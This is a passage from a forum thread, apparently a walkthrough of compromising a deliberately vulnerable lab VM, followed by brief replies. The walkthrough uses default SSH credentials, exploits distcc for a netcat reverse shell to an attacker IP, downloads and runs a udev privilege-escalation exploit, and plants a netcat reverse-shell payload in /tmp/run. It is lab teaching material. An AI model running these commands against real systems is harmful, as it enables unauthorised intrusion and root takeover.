<p>To identify the exact OS informations I‚Äôll start just now to enumerate the exact OS, because the banners of the results from <strong>nmap</strong> can be false positive or just not exactly enough. So I have to identify the exact OS version manually using  ssh.</p>
<p>So let me login using the SSH service:<br>
<code># ssh <a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="452836232421282c2b0574756b74746b746b7475">[email&#160;protected]</a></code><br>
<code>.. (yes/no)? yes</code><br>
<code>... password: msfadmin</code><br>
<code>$ uname -a</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/6/6279c09a89a0aa6b0da3b2f08a2b423a074999b5.PNG" data-download-href="/uploads/short-url/e39E0DKRjx2TrSnJbh25IC3qfdP.PNG?dl=1" title="15.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/6/6279c09a89a0aa6b0da3b2f08a2b423a074999b5.PNG" width="690" height="325"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">15.PNG</span><span class="informations">906√ó427 220 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Now lets take a look if we have access to run a shell with root privileges.</p>
<p><code>$ sudo -i</code><br>
<code>password: msfadmin</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/0/0e783b6b44871e1a3c3fa7f08ce0435de3da9c40.PNG" data-download-href="/uploads/short-url/240hoWWjLIekGwv8vFpcRrR0ICI.PNG?dl=1" title="19.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/0/0e783b6b44871e1a3c3fa7f08ce0435de3da9c40.PNG" width="690" height="298"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">19.PNG</span><span class="informations">752√ó325 147 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<h1><a name="p-16696-one-of-a-lot-ways-are-done-7" class="anchor" href="#p-16696-one-of-a-lot-ways-are-done-7"></a>One of a lot ways are done!</h1>
<p>Now I have access to a full privileged account and I‚Äôm controlling the system. There exist more other ways to pwn this machine. I showed you the first way I tried out.</p>
<p>Let‚Äôs see if I can break into using another way.</p>
<h1><a name="p-16696-h-10-simple-vulnerability-detection-8" class="anchor" href="#p-16696-h-10-simple-vulnerability-detection-8"></a>10. Simple Vulnerability Detection</h1>
<p>What I will do is a simple vulnerability scan with <strong>nmap</strong>.</p>
<p><code># nmap --script vuln 10.11.1.10 -p- --open</code></p>
<p>This scan shows me a lot of vulnerable stuff but the most of them are SSL or DOS vulnerabilities. I picked up the <strong>distcc</strong> daemon because the vulnerability seems to be exploitable.</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/6/6a7b79331b915dfb106ec105fc424180532e83e8.PNG" data-download-href="/uploads/short-url/fbZ9s9iolhf4OLjCMTge62UL7v2.PNG?dl=1" title="20.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/6/6a7b79331b915dfb106ec105fc424180532e83e8.PNG" width="690" height="312"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">20.PNG</span><span class="informations">851√ó385 187 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<h1><a name="p-16696-h-12-exploit-research-9" class="anchor" href="#p-16696-h-12-exploit-research-9"></a>12. Exploit Research</h1>
<p>I found an exploit by using <strong>searchsploit</strong> pretty fast. There is just one result.</p>
<p><code># searchsploit distcc</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/7/74a65c8a4afbda233d1cf2257ab5df918c255a73.PNG" data-download-href="/uploads/short-url/gDVOuALJ2jDuAPODzfZhx7zofET.PNG?dl=1" title="21.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/7/74a65c8a4afbda233d1cf2257ab5df918c255a73.PNG" width="690" height="115"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">21.PNG</span><span class="informations">936√ó157 65.4 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Mh. The exploit is handled by MSF and I <strong>don‚Äôt</strong> want to use it.<br>
So let me think a little bit. Did I missed something?<br>
How did I found this vulnerability? ‚Üí Using <strong>Nmap</strong>.<br>
Ok. I used a script for that.<br>
So let me take a look one more time at the results.</p>
<p>Oh.. I overlooked that the script (<code>distcc-cve2004-2687.nse</code>) used the <code>id</code> command for the ‚ÄúExtra Information‚Äù which shows me the <strong>uid</strong> of the current user. <img src="../../images/emoji/twitter/slightly_frowning_face8e5e.png?v=15" title=":slightly_frowning_face:" class="emoji" alt=":slightly_frowning_face:" loading="lazy" width="20" height="20"> * <em>shame</em> *<br>
So it looks like the <strong>Nmap</strong> sent this command to this service. Let me take a look over the documentation of this script from the homepage.<br>
NSE-doc: <a href="../../../external.html?link=https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html" rel="noopener nofollow ugc">distcc-cve2004-2687.nse</a></p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/f/ff3d7acf7ccbc4b438e003e6014f1eb58da18015.PNG" width="564" height="64"></p>
<h1><a name="p-16696-h-14-exploitation-10" class="anchor" href="#p-16696-h-14-exploitation-10"></a>14. Exploitation</h1>
<p>Let me change it to possibly get a bind shell using <strong>netcat</strong> at first and then try to connect to it.</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/5/5e73ce0db13acb02b9e1f28b7d7403066e9a0016.PNG" data-download-href="/uploads/short-url/dtyZzm2jsxUwBeMxIc6cb1RLw8K.PNG?dl=1" title="23.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/5/5e73ce0db13acb02b9e1f28b7d7403066e9a0016.PNG" width="542" height="499"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">23.PNG</span><span class="informations">807√ó744 156 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Nice! Bind shell works and additional I found out the machine has netcat installed. Let me see if a reverse shell works too.<br>
So I setup a listener on port 6666 and then run the <strong>nmap-script</strong> with the cmd for a reverse shell.</p>
<p><code># nmap 10.11.1.10 -p 3632 --script distcc-cve2004-2687.nse --script-args="distcc-cve2004-2687.cmd='nc -nv 10.11.1.11 6666 -e /bin/sh'"</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/c/c3e99963c0f29de3b67fbd5647c273d7e40c1858.PNG" data-download-href="/uploads/short-url/rX7ACwXRGRGV96Ctb2UQAEXmPLG.PNG?dl=1" title="39.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/c/c3e99963c0f29de3b67fbd5647c273d7e40c1858.PNG" width="690" height="357"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">39.PNG</span><span class="informations">934√ó484 158 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Very nice! Now I have a reverse shell.<br>
Now I want to spawn a TTY using python.</p>
<p><code>python -c 'import pty; pty.spawn("/bin/sh")'</code></p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/2/283b92d7f58fb53d13a0b36138e01e5d296fddfc.PNG" width="458" height="174"></p>
<h1><a name="p-16696-h-15-post-enumeration-11" class="anchor" href="#p-16696-h-15-post-enumeration-11"></a>15. Post-Enumeration</h1>
<p>Now I want to get root without interactive mode for sudo. So I have to enumerate some stuff.</p>
<p><code>$ uname -a</code><br>
<code>$ cat /proc/version</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/3/366db23c4a441515932b3a26ddb78fc4c2b97516.PNG" data-download-href="/uploads/short-url/7LuO0b8QxEE6JyTSFrLMzzuxjYa.PNG?dl=1" title="30.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/3/366db23c4a441515932b3a26ddb78fc4c2b97516.PNG" width="690" height="119"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">30.PNG</span><span class="informations">938√ó163 73.8 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>The kernel &amp; OS version seems to be outdated. * <em>.. You don‚Äôt say..</em> *<br>
I take a quick search on google to find an privilege escalation exploit especially for this version.<br>
So I search for <strong>Ubuntu 4.2.3-2ubuntu7</strong>. Google shows me the name of this version called Hardy.</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/9/989a50e19359762fe8a30e503766f7e1e0263aae.PNG" width="603" height="29"></p>
<p>My next step is to google for this version name. And you can see a few interesting results.<br>
I searched a little bit about every exploit and found the <a href="../../../external.html?link=http://www.cvedetails.com/cve/cve-2009-1185" rel="noopener nofollow ugc">CVE-2009-1185</a> very pretty. I will try it out. In the results before I found it on the <a href="../../../external.html?link=https://www.exploit-db.com/exploits/8572/" rel="noopener nofollow ugc">exploit-db</a>. So maybe I have it locally already.</p>
<p><code>searchsploit 8572 linux</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/b/bdab2a221a6940893dfaa69e27b8e543074d5d5a.PNG" data-download-href="/uploads/short-url/r3SXxytOM1qdKsCvsbucHJfGLbQ.PNG?dl=1" title="32.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/b/bdab2a221a6940893dfaa69e27b8e543074d5d5a.PNG" width="690" height="123"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">32.PNG</span><span class="informations">937√ó168 69.4 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Nice!</p>
<h1><a name="p-16696-h-16-privilege-escalation-12" class="anchor" href="#p-16696-h-16-privilege-escalation-12"></a>16. Privilege Escalation</h1>
<p>Let‚Äôs copy the exploit to my directory.</p>
<p><code># locate 8572.c</code><br>
<code># cp /usr/share/exploitdb/platforms/lin_x86-64/local/8572.c privescal.c</code></p>
<p>I want to take a look inside the code to see if I have to take note for some configurations or usage.</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/3/3404c616628ee18c68f4bdbd7e0a708ada61f1bd.PNG" data-download-href="/uploads/short-url/7qb3ub37QDqB0aHHYTf52q5dr6R.PNG?dl=1" title="34.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/3/3404c616628ee18c68f4bdbd7e0a708ada61f1bd.PNG" width="690" height="105"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">34.PNG</span><span class="informations">817√ó125 51.2 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>So I have to pay attention to</p>
<ol>
<li>right <strong>PID of udevd</strong> (PID - 1 as argv[1]),</li>
<li><strong>/tmp/run</strong> and</li>
<li>the <strong>payload</strong> inside it.</li>
</ol>
<p>Simple usage.<br>
But before I can transfer this exploit I have to setup a basic Python Webserver on port 8080.</p>
<p><code># python -m SimpleHTTPServer 8080</code></p>
<p>After that I use the reverse shell to get the file with <strong>wget</strong> from my machine, compile the code, add my payload to /tmp/run and look for the PID.</p>
<p><code>$ wget http://10.11.1.11:8080/privescal.c</code><br>
<code>$ gcc privescal.c -o privs</code><br>
<code>$ echo '#!/bin/sh\n/bin/netcat 10.11.1.11 5555 -e /bin/sh' &gt; /tmp/run</code><br>
<code>$ ps aux | grep udev</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/e/ebdc374cfe43f923aabc6f39b284393dca9f4d02.PNG" data-download-href="/uploads/short-url/xEw10gL5DomLkhRENx7wWEYFZBw.PNG?dl=1" title="38.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/e/ebdc374cfe43f923aabc6f39b284393dca9f4d02.PNG" width="690" height="288"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">38.PNG</span><span class="informations">870√ó364 166 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Now I will use the founded PID  - 1  (<strong>2575</strong>)  for this exploit.</p>
<p>After starting my listener I‚Äôm ready to catch the shell‚Ä¶</p>
<p><code># nc -nlvp 5555</code><br>
<code>$ ./privs 2575</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/0/056d14b78a41e36e4747c738c72c80dae8a52864.PNG" data-download-href="/uploads/short-url/M05IfIhqME8Bd9yI75XC3ghX1y.png?dl=1" title="39.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/0/056d14b78a41e36e4747c738c72c80dae8a52864.PNG" width="690" height="452"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">39.PNG</span><span class="informations">748√ó490 104 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<h1><a name="p-16696-done-13" class="anchor" href="#p-16696-done-13"></a>Done!</h1>
<blockquote>
<p>If you have some advice or recommendation to improve my methodology, or want me to add more ways to it so feel free and just tell me that.</p>
</blockquote>
<p>Thx and have a nice day!<br>
Cry0l1t3</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="21" />
              <span class='post-likes'>21 Likes</span>
            </div>


            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Noswis.html'><span itemprop='name'>Noswis</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-10-19T09:23:22Z' class='post-time'>
                    October 19, 2017,  9:23am
                  </time>
                  <meta itemprop='dateModified' content='2017-10-19T09:23:22Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Interesting read mate! I‚Äôd like to see in what other ways you were able to pwn the machine besides a brute-force attack.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Sirius.html'><span itemprop='name'>Sirius</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-10-19T17:24:33Z' class='post-time'>
                    October 19, 2017,  5:24pm
                  </time>
                  <meta itemprop='dateModified' content='2017-10-19T17:24:33Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Especially considering this particular VM is FILLED with holes. ;3</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/ripmeout.html'><span itemprop='name'>ripmeout</span></a>
                (Mohd Amri)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-10-24T13:55:11Z' class='post-time'>
                    October 24, 2017,  1:55pm
                  </time>
                  <meta itemprop='dateModified' content='2017-10-24T13:55:11Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>You might wanna check out <a href="../../../external.html?link=https://www.vulnhub.com/" rel="nofollow noopener">VulnHub</a>.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Retr1.html'><span itemprop='name'>Retr1</span></a>
                (The memelord of 0x00sec)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-11-05T11:08:07Z' class='post-time'>
                    November 5, 2017, 11:08am
                  </time>
                  <meta itemprop='dateModified' content='2017-11-05T11:08:07Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>i know i‚Äôm a bit late to the party, but a nice walkthrough right there.</p>
<p>maybe a little bit less screenshots would‚Äôve been easier on the eyes, but other than that great writeup</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Cry0l1t3.html'><span itemprop='name'>Cry0l1t3</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-11-22T09:17:06Z' class='post-time'>
                    November 22, 2017,  9:17am
                  </time>
                  <meta itemprop='dateModified' content='2017-11-22T09:17:06Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <aside class="quote no-group" data-username="Noswis" data-post="2" data-topic="3964" data-full="true">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="../../letter_avatar_proxy/v4/letter/n/ba8739/48.png" class="avatar"> Noswis:</div>
<blockquote>
<p>Interesting read mate! I‚Äôd like to see in what other ways you were able to pwn the machine besides a brute-force attack.</p>
</blockquote>
</aside>
<p>I will create a few extra ways soon. <img src="../../images/emoji/twitter/wink8e5e.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/behk.html'><span itemprop='name'>behk</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-11-22T17:49:02Z' class='post-time'>
                    November 22, 2017,  5:49pm
                  </time>
                  <meta itemprop='dateModified' content='2017-11-22T17:49:02Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>I‚Äôd like to add an specific reference to this one, which happens to be a really good and free resource by the Offensive Security team.</p>
<p>Metasploit Unleashed is a course (kinda, more like a paper on the solution) they developed which I think is important to anyone that wants to get involved with the solution, in this one they reference to do a lot of the testing with Metasploitable. (link below)</p>
<p>Hope this enhances your post <img src="../../../0x00sec.org/images/emoji/twitter/slight_smilec164.html?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p><a href="../../../external.html?link=https://www.offensive-security.com/metasploit-unleashed/" class="onebox" target="_blank" rel="nofollow noopener">https://www.offensive-security.com/metasploit-unleashed/</a></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_8' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/system.html'><span itemprop='name'>system</span></a>
                (system)
                  Closed 
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-01-21T00:42:58Z' class='post-time'>
                    January 21, 2018, 12:42am
                  </time>
                  <meta itemprop='dateModified' content='2018-01-21T00:42:58Z'>
              <span itemprop='position'>8</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="O2jrImMyGprJCPFT0Jo5z9ZSC"></script>
  </body>
  
</html>
